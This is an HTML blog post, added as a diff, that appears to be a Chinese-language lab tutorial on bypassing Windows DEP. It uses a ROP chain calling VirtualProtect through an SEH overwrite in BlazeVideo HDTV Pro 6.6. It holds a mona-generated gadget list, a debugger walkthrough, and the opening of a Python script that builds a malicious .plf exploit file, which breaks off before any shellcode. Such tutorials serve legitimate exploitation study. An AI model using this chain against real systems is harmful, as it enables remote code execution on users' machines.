@@ -1,0 +1,490 @@
+<!doctype html>
+<html lang="zh-cn">
+<head>
+
+    <meta charset="utf-8">
+    <meta name="generator" content="Hugo 0.78.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Windows Buffer Overflow(2) | GET command and control</title>
+    <meta property="og:title" content="Windows Buffer Overflow(2) - GET command and control">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content="2021-02-27T09:12:35&#43;08:00">
+        
+        
+    <meta property="article:modified_time" content="2021-02-27T09:12:35&#43;08:00">
+        
+    <meta name="Keywords" content="penetration">
+    <meta name="description" content="Windows Buffer Overflow(2)">
+        
+    <meta name="author" content="KUHAKU">
+    <meta property="og:url" content="https://GETC2.github.io/post/windows-buffer-overflow2/">
+    <link rel="shortcut icon" href="/favicon-bug.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/css/normalize.css">
+    
+        <link rel="stylesheet" href="/css/prism.css">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+
+    
+
+
+    
+    
+</head>
+
+<body>
+<header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://GETC2.github.io/">
+                        GET command and control
+                    </a>
+                
+                <p class="description">Stay hungry. Stay foolish.</p>
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="current" href="https://GETC2.github.io/">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+<div id="body">
+    <div class="container">
+        <div class="col-group">
+
+            <div class="col-8" id="main">
+                <div class="res-cons">
+                    <article class="post">
+                        <header>
+                            <h1 class="post-title">Windows Buffer Overflow(2)</h1>
+                        </header>
+                        <date class="post-meta meta-date">
+                            2021年2月27日
+                        </date>
+                        
+                        
+                        
+                        <div class="post-content">
+                            <h1 id="windows栈溢出2">Windows栈溢出（2）</h1>
+<p>之前介绍过如何绕过<code>ASLR</code>和<code>safeSEH</code>并利用栈溢出；在<code>Linux</code>上面也介绍了如何利用<code>ret2libc</code>来绕过<code>DEP</code>。这里来介绍一下在<code>Windows</code>上如何绕过<code>DEP</code>。</p>
+<p>主要的思路是通过调用<code>Windows</code>的函数来关闭<code>DEP</code>，然后让控制转到堆栈上的<code>shellcode</code>。相比于<code>ret2libc</code>绕过<code>DEP</code>，通过这种方法编写的<code>exploit</code>在多个操作系统版本上成功的可能性更高，而且灵活性更强。<code>Windows</code>操作系统是通过<code>API</code>来调用内核代码的，不同版本之间<code>API</code>虽然相同，但是底层实现或者地址不同。再加上系统自带的<code>dll</code>默认都是加入<code>ASLR</code>的，所以通过<code>ret2libc</code>编写的<code>exploit</code>的跨平台性较差。</p>
+<p>我们通过调用<code>VirtualProtect()</code>函数来关闭<code>DEP</code>。该函数接受地址参数，地址范围参数以及关于这一段地址范围的<code>flag</code>。我们的目的就是指定堆栈上的<code>shellcode</code>为地址范围，<code>flag</code>设置为可读可写可执行。这样就可以执行堆栈上的<code>shellcode</code>。</p>
+<p>该函数具体定义如下：</p>
+<pre><code>BOOL WINAPI	VirtualProtect(
+_in LPVOID IpAddress,
+_in SIZE_T dwSize,
+_in DWORD flNewProtect,
+_out PDWORD IpflOldProtect
+);
+</code></pre><p>第一个参数为开始地址，第二个参数为地址范围大小，第三个参数为<code>flag</code>，第四个参数指针，指向任意可写地址，用来写指定地址范围原来的<code>flag</code>。</p>
+<p>因此通过调用<code>VirtualProtect</code>关闭<code>DEP</code>的话，堆栈的布局应该如下所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_09-53-31.png" alt=""></p>
+<p>从上往下为低地址到高地址：</p>
+<ol>
+<li>首先是任意填充字符直到<code>SEH</code>指向<code>handler</code>的指针部分。</li>
+<li>然后是一个指针，该指针覆盖指向<code>handler</code>的指针。这个指针指向一个静态指令序列，该指令序列的作用是保存此时<code>%esp</code>的值，之后可以通过<code>VirtualProtect</code>函数指针，参数和此时<code>%esp</code>的相对距离来填充函数指针和参数，而不用担心<code>ASLR</code>导致栈的位置不一致性问题。</li>
+<li>接着是指向另一个指令序列的指针，该指令序列直接调整<code>%esp</code>的值，使其跨过之后的函数指针和参数。</li>
+<li>然后是<code>VirtualProtect</code>函数指针和参数的占位符。<code>VirtualProtect</code>是系统内置函数，由于<code>ASLR</code>的关系我们不知道该函数的地址；再加上该函数的参数可能有<code>null byte</code>，我们无法事先填充好参数，所以用占位符代替，之后通过其他静态的指令序列来填充这些值。</li>
+<li>之后是一系列的指令序列地址。简单的来说，这些指令序列的作用就是计算<code>VirtualProtect</code>函数的地址以及参数，然后填充刚刚的占位符。</li>
+<li>最后是我们的<code>sledding</code>以及<code>shellcode</code>。</li>
+</ol>
+<p>所以简单的来说就是通过一系列静态的指令序列来填充<code>VirtualProtect</code>函数指针以及参数，然后调用该函数使得我们的<code>shellcode</code>部分的堆栈可以关闭<code>DEP</code>,执行代码。</p>
+<p>接下啦就用实验来展示这些指令序列的具体操作。</p>
+<h2 id="实验">实验</h2>
+<h3 id="目标">目标</h3>
+<p>和之前的栈溢出相同，我们的目标是<code>BlazeVideo HDTV Pro 6.6</code>，我们要通过覆盖<code>SEH</code>中指向<code>handler</code>的指针来执行我们的代码。并通过<code>VirtualProtect</code>函数关闭<code>shellcode</code>部分的<code>DEP</code>，最后控制转到<code>shellcode</code>。</p>
+<h3 id="步骤">步骤</h3>
+<p>和之前一样，我们用<code>Immunity</code> 调试目标程序，同时利用之前介绍的<code>mona</code>来寻找可以关闭<code>DEP</code>，即填充<code>VirtualProtect</code>函数指针和参数的一系列指令序列。这里用到的<code>mona</code>命令如下：</p>
+<p><code>!mona rop -o -cp nonull</code></p>
+<p><code>rop</code>代表<code>return oriented programming</code>；<code>-o</code>代表排除系统自带的<code>dll</code>，因为这些<code>dll</code>默认开启<code>ASLR</code>；<code>-cp nonull</code>代表寻找不包含<code>null byte</code>的指令序列。</p>
+<p>最后<code>mona</code>帮我们找到的指令序列以及堆栈的推荐布局如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># rop chain generated with mona.py - www.corelan.be</span>
+<span style="color:#75715e"># ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :</span>
+    rop_gadgets <span style="color:#f92672">=</span> [
+      <span style="color:#ae81ff">0x6032d179</span>,  <span style="color:#75715e"># POP EAX # RETN [Configuration.dll] </span>
+      <span style="color:#ae81ff">0x640562cc</span>,  <span style="color:#75715e"># ptr to &amp;VirtualProtect() [IAT MediaPlayerCtrl.dll]</span>
+      <span style="color:#ae81ff">0x6403a80b</span>,  <span style="color:#75715e"># MOV EAX,DWORD PTR DS:[EAX] # RETN [MediaPlayerCtrl.dll] </span>
+      <span style="color:#ae81ff">0x640365ee</span>,  <span style="color:#75715e"># XCHG EAX,ESI # RETN [MediaPlayerCtrl.dll] </span>
+      <span style="color:#ae81ff">0x6030a38d</span>,  <span style="color:#75715e"># POP EBP # RETN [Configuration.dll] </span>
+      <span style="color:#ae81ff">0x6034be03</span>,  <span style="color:#75715e"># &amp; call esp [Configuration.dll]</span>
+      <span style="color:#ae81ff">0x641135fa</span>,  <span style="color:#75715e"># POP EAX # RETN [NetReg.dll] </span>
+      <span style="color:#ae81ff">0xfffffdff</span>,  <span style="color:#75715e"># Value to negate, will become 0x00000201</span>
+      <span style="color:#ae81ff">0x60338cb7</span>,  <span style="color:#75715e"># NEG EAX # RETN [Configuration.dll] </span>
+      <span style="color:#ae81ff">0x61641c70</span>,  <span style="color:#75715e"># XCHG EAX,EBX # RETN [EPG.dll] </span>
+      <span style="color:#ae81ff">0x61325282</span>,  <span style="color:#75715e"># POP EAX # RETN [DTVDeviceManager.dll] </span>
+      <span style="color:#ae81ff">0xffffffc0</span>,  <span style="color:#75715e"># Value to negate, will become 0x00000040</span>
+      <span style="color:#ae81ff">0x6033c0a4</span>,  <span style="color:#75715e"># NEG EAX # RETN [Configuration.dll] </span>
+      <span style="color:#ae81ff">0x64011f80</span>,  <span style="color:#75715e"># XCHG EAX,EDX # POP ESI # ADD ESP,8 # RETN 0x0C [MediaPlayerCtrl.dll] </span>
+      <span style="color:#ae81ff">0x41414141</span>,  <span style="color:#75715e"># Filler (compensate)</span>
+      <span style="color:#ae81ff">0x41414141</span>,  <span style="color:#75715e"># Filler (compensate)</span>
+      <span style="color:#ae81ff">0x41414141</span>,  <span style="color:#75715e"># Filler (compensate)</span>
+      <span style="color:#ae81ff">0x6404c45f</span>,  <span style="color:#75715e"># POP ECX # RETN [MediaPlayerCtrl.dll] </span>
+      <span style="color:#ae81ff">0x41414141</span>,  <span style="color:#75715e"># Filler (RETN offset compensation)</span>
+      <span style="color:#ae81ff">0x41414141</span>,  <span style="color:#75715e"># Filler (RETN offset compensation)</span>
+      <span style="color:#ae81ff">0x41414141</span>,  <span style="color:#75715e"># Filler (RETN offset compensation)</span>
+      <span style="color:#ae81ff">0x6406255e</span>,  <span style="color:#75715e"># &amp;Writable location [MediaPlayerCtrl.dll]</span>
+      <span style="color:#ae81ff">0x60329371</span>,  <span style="color:#75715e"># POP EDI # RETN [Configuration.dll] </span>
+      <span style="color:#ae81ff">0x6403e80e</span>,  <span style="color:#75715e"># RETN (ROP NOP) [MediaPlayerCtrl.dll]</span>
+      <span style="color:#ae81ff">0x6162eaf0</span>,  <span style="color:#75715e"># POP EAX # RETN [EPG.dll] </span>
+      <span style="color:#ae81ff">0x90909090</span>,  <span style="color:#75715e"># nop</span>
+      <span style="color:#ae81ff">0x6402abf8</span>,  <span style="color:#75715e"># PUSHAD # RETN [MediaPlayerCtrl.dll] </span>
+    ]
+</code></pre></div><p>如代码所示，这些值是通过缓冲区溢出复制进堆栈的，一些值是指令序列的地址，另一些值指令序列用到的操作数或者是单纯的<code>padding</code>。借由<code>mona</code>生成的这段堆栈布局最红是有一些问题的，我们需要稍微修改一下才能成功填充<code>VirtualProtect</code>函数的指针。</p>
+<p>但是仅有这些指令序列没有用，我们还要将控制交给这些指令才算成功。结合我们之前介绍的绕过<code>safeSEH</code>并覆盖<code>SEH</code>的指向<code>handler</code>的指针的方法，以及<code>handler</code>执行时堆栈的布局，我们可以用这个指令序列的地址来覆盖<code>handler</code>指针：</p>
+<p><code>#ADD ESP,800 #RETN</code></p>
+<p>这条指令将·<code>%esp</code>向堆栈底部移动，因为此时的堆栈顶部内容不受我们控制，真正借由缓冲区溢出而被我们控制的堆栈此时还在底部，所以我们将<code>%esp</code>向下移动。</p>
+<p>接下来我们就在<code>handler</code>处设置断点，借由<code>Immunity</code>的单步执行来展示我们是如何填充<code>VirutalProtect</code>的函数指针和参数并执行<code>shellcode</code>的：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_15-17-56.png" alt=""></p>
+<p>此时堆栈的布局如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_15-38-58.png" alt=""></p>
+<p>单步执行之后堆栈布局如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_15-41-27.png" alt=""></p>
+<p>此时堆栈中是一系列指针，该指针指向以下指令序列：</p>
+<p><code># ADD ESP 28 #RETN</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_15-43-51.png" alt=""></p>
+<p>所以这一段指令的作用还是将<code>%esp</code>向堆栈顶部移动。为什么要多此一举呢？因为该目标程序在64位的<code>Windows</code>7和8上，单靠<code># ADD ESP 800 #RETN</code>还不够让<code>%esp</code>跨过<code>SEH</code>, <code>SEH</code>中有指向<code>#ADD ESP,800 #RETN</code>的指针，为了不再一次执行这个指令，我们需要这一段跳板接着将栈指针向底部移动并跳过<code>SEH</code>。</p>
+<p>一直单步执行，直到堆栈布局如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_15-47-22.png" alt=""></p>
+<p>同时下一个执行的指令如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_15-43-51.png" alt=""></p>
+<p>可以看到下一个单步执行使得<code>%esp</code>跨过<code>SE handler</code>部分，这之后堆栈部分的值暂时都为<code>0x6130534a</code>，这是一个指针，指向<code>#RETN</code>指令：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_16-12-16.png" alt=""></p>
+<p>这个指令相当于<code>NOP</code>指令，因为它的作用只是不停地将栈指针向底部移动，直到由<code>mona</code>生成的填充<code>VirtualProtect</code>函数指针和参数的指令序列地址。</p>
+<p>我们一直单步执行，直到到达<code>mona</code>所产生的指令序列地址：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_16-15-36.png" alt=""></p>
+<p>该指令地址指向：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_16-18-18.png" alt=""></p>
+<p>如上所示，这是由<code>mona</code>生成的第一个指令序列。该指令的作用就是将堆栈顶部的值<code>pop</code>到<code>%ebp</code>中。而这个值就是作为<code>VirtualProtect</code>函数执行完毕之后的返回指针。</p>
+<p>这之后的一系列指令会将调用<code>VirtualProtect</code>所需的堆栈值，包括函数指针，参数，返回指针都放进寄存器中，然后用<code>#PUSHAD #RETN</code>指令将这些值<code>push</code>到堆栈中，然后开始调用<code>VirtualProtect</code>函数。<code>PUSHAD</code>会将以下寄存器按顺序<code>push</code>到堆栈中：<code>EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</code>。该指令结束后堆栈中的布局如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_16-20-25.png" alt=""></p>
+<p>对照调用<code>VirtualProtect</code>函数所需要的参数以及返回指针位置，我们可以实现决定哪些寄存器存放哪些值。其中<code>%edi</code>存放指向<code>#RETN</code>的指针，加上<code>PUSHAD</code>之后的<code>RETN</code>命令，可以顺利将控制权交给<code>VirtualProtect</code>函数。而<code>%ebp</code>中存放的返回指针指向以下指令：</p>
+<p><code>#PUSH ESP #RETN 0C</code></p>
+<p>由于<code>VirtualProtect</code>函数内部最后的<code>RETN &lt;n&gt;</code>指令会清理参数，因此当函数返回后，<code>%ebp</code>指向由<code>%eax</code>所填充的<code>NOPS</code>，堆栈后面就是更多的<code>NOPS</code>以及<code>shellcode</code>；此时<code>%eip</code>指向<code>#PUSH ESP #RETN 0C</code>。而且此时这些<code>NOPS</code>指令之后的堆栈区域是可以执行的，所以可以顺利将控制权交给<code>sledding</code>和<code>shellcode</code>。</p>
+<p>我们接着看接下来的指令序列：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-42-33.png" alt=""></p>
+<p>此时的堆栈顶部为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-42-48.png" alt=""></p>
+<p>单步执行后，<code>%eax</code>为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-42-48.png" alt=""></p>
+<p>接下来的指令序列为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-48-32.png" alt=""></p>
+<p>执行完后，<code>%eax</code>值为以下所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-43-59.png" alt=""></p>
+<p>之后的指令序列为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-49-44.png" alt=""></p>
+<p>执行完后，<code>%eax</code>与<code>%ebx</code>值对调：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-53-12.png" alt=""></p>
+<p>从上面推断出的<code>PUSHAD</code>命令执行前<code>%ebx</code>应该包含<code>dwSize</code>这个参数，而<code>0x00000201</code>正表示这个参数。</p>
+<p>之后的指令序列构造参数<code>flag</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-53-55.png" alt=""></p>
+<p>该指令序列将堆栈顶的值<code>pop</code>到<code>%eax</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-54-06.png" alt=""></p>
+<p>接着的指令序列为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-55-50.png" alt=""></p>
+<p>执行后，<code>%eax</code>的值为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-56-03.png" alt=""></p>
+<p>这就是<code>flag</code>参数所需的值，然后需要把这个值复制到<code>%edx</code>中：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_17-58-55.png" alt=""></p>
+<p>图上所示的指令序列中<code>#POP ESI #ADD ESP,8</code>不是我们想要的指令，因此我们需要在堆栈上填充一些<code>padding</code>。</p>
+<p>接下来的指令序列设置<code>VirtualProtect</code>的函数指针：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-00-48.png" alt=""></p>
+<p>此时堆栈的顶端为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-00-58.png" alt=""></p>
+<p>这个值是一个指针，该指针指向<code>IAT</code>，即<code>Import Address Table</code>中的一个<code>Entry</code>。该<code>Entry</code>中存放着<code>VirtualProtect</code>函数的指针。虽然<code>VirtualProtect</code>函数的位置是不确定的，但是由于<code>IAT</code>的位置是静态不变的，因此我们可以利用<code>IAT</code>中对应<code>VirtualProtect</code>函数的<code>Entry</code>的地址来间接的获得函数指针。</p>
+<p>这个指令执行完后，<code>%eax</code>的值就是该<code>Entry</code>的地址：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-06-25.png" alt=""></p>
+<p>下一个指令序列就需要解引用这个<code>Entry</code>中存放的指针来获得真正的函数指针：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-06-13.png" alt=""></p>
+<p>执行完后，<code>%eax</code>中存放着函数的指针：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-08-14.png" alt=""></p>
+<p>然后我们需要把该指针存放到<code>%esi</code>中去，所以下一个指令序列为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-09-32.png" alt=""></p>
+<p>下一个指令序列用于设置函数的最后一个参数，即任意可写的地址：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-10-07.png" alt=""></p>
+<p>此时堆栈顶端为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-10-16.png" alt=""></p>
+<p>接下来的指令序列设置<code>%edi</code>中的指针，该值在<code>PUSHAD</code>后在堆栈顶端：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-14-02.png" alt=""></p>
+<p>此时堆栈的顶端为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-14-20.png" alt=""></p>
+<p>正如前面所说，该值是指针，指向指令<code>RETN</code>。</p>
+<p>接下来的指令序列设置<code>%eax</code>，<code>%eax</code>中的值在<code>PUSHAD</code>执行之后处于堆栈底端，该值后面就是<code>sledding</code>和<code>shellcode</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-17-18.png" alt=""></p>
+<p>此时堆栈顶端为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-17-32.png" alt=""></p>
+<p>可以看到，我们给<code>%eax</code>填充的值为<code>NOPS</code>。</p>
+<p>接下来就是最后一个指令序列<code>PUSHAD</code>了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-19-58.png" alt=""></p>
+<p>而此时寄存器的值为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-20-10.png" alt=""></p>
+<p>堆栈的顶端为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-21-16.png" alt=""></p>
+<p>可以看到，此时寄存器中关于<code>VirtualProtect</code>函数的指针以及参数，返回指针都设置好了，其中<code>IpAddress</code>参数为<code>%esp</code>的值，即指向现在堆栈的顶部，现在堆栈顶部为<code>NOPS</code>，也就是说，如果函数调用结束后，堆栈顶端往后的区域在<code>dwSize</code>范围内都可以执行。当然由于设置<code>flag</code>的最小内存单位是<code>page</code>，所以其实堆栈顶部再往上的一些部分也可以执行。</p>
+<p><code>#PUSHAD #RETN</code>执行完后，就把控制转移给<code>VirtualProtect</code>函数，这中间的调用过程就略去不看。直接在<code>VirtualProtect</code>的返回指针处设置断点：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-26-47.png" alt=""></p>
+<p>然后执行直到断点，此时堆栈顶端为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-27-30.png" alt=""></p>
+<p>可以看到，这之后从断点处开始执行后，<code>%eip</code>指向此时堆栈的顶部，而该处的指令为<code>sledding</code>以及<code>shellcode</code>。由于此时堆栈顶部往后包括<code>shellcode</code>已经关闭<code>DEP</code>了，所以可以顺利执行<code>shellcode</code>。我们直接执行，然后确认一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2021-02-27_18-31-57.png" alt=""></p>
+<p>由于<code>shellcode</code>开启31337端口，因此我们发现<code>shellcode</code>的确成功执行了。</p>
+<p>为了完整起见，将生成<code>exploit+payload</code>的脚本贴出来：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct
+file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;blaze_exploit.plf&#39;</span>
+
+totalsize <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>
+adv <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x61310eaf</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">218</span>     <span style="color:#75715e"># ADD ESP,28 # RETN    ** [DTVDeviceManager.dll]</span>
+
+<span style="color:#75715e">#we don&#39;t need nseh</span>
+seh <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6130534a</span>)  <span style="color:#75715e"># ADD ESP,800 # RETN    ** [DTVDeviceManager.dll]</span>
+rop <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x61326003</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">44</span> <span style="color:#75715e"># RETN (ROP NOP) [DTVDeviceManager.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6030a38d</span>)  <span style="color:#75715e"># POP EBP # RETN [Configuration.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6161055a</span>)  <span style="color:#75715e"># &amp; PUSH ESP # RETN 0c [EPG.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x641135fa</span>)  <span style="color:#75715e"># POP EAX # RETN [NetReg.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0xfffffdff</span>)  <span style="color:#75715e"># Value to negate, will become 0x00000201</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x60338cb7</span>)  <span style="color:#75715e"># NEG EAX # RETN [Configuration.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x61641c70</span>)  <span style="color:#75715e"># XCHG EAX,EBX # RETN [EPG.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x61325282</span>)  <span style="color:#75715e"># POP EAX # RETN [DTVDeviceManager.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0xffffffc0</span>)  <span style="color:#75715e"># Value to negate, will become 0x00000040</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6033c0a4</span>)  <span style="color:#75715e"># NEG EAX # RETN [Configuration.dll</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x64011f80</span>)  <span style="color:#75715e"># XCHG EAX,EDX # POP ESI # ADD ESP,8 # RETN 0x0C [MediaPlayerCtrl.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x41414141</span>)  <span style="color:#75715e"># Filler (compensate)</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x41414141</span>)  <span style="color:#75715e"># Filler (compensate)</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x41414141</span>)  <span style="color:#75715e"># Filler (compensate)</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6032d179</span>)  <span style="color:#75715e"># POP EAX # RETN [Configuration.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x41414141</span>)  <span style="color:#75715e"># Filler (compensate)</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x41414141</span>)  <span style="color:#75715e"># Filler (compensate)</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x41414141</span>)  <span style="color:#75715e"># Filler (compensate)</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x640562cc</span>)  <span style="color:#75715e"># ptr to &amp;VirtualProtect() [IAT MediaPlayerCtrl.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6403a80b</span>)  <span style="color:#75715e"># MOV EAX,DWORD PTR DS:[EAX] # RETN [MediaPlayerCtrl.dll]</span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x640365ee</span>)  <span style="color:#75715e"># XCHG EAX,ESI # RETN [MediaPlayerCtrl.dll] </span>
+rop<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>, <span style="color:#ae81ff">0x6404c45f</span>)  <span style="color:#75715e"># POP ECX # RETN [MediaPlayerCtrl.dll] </span>
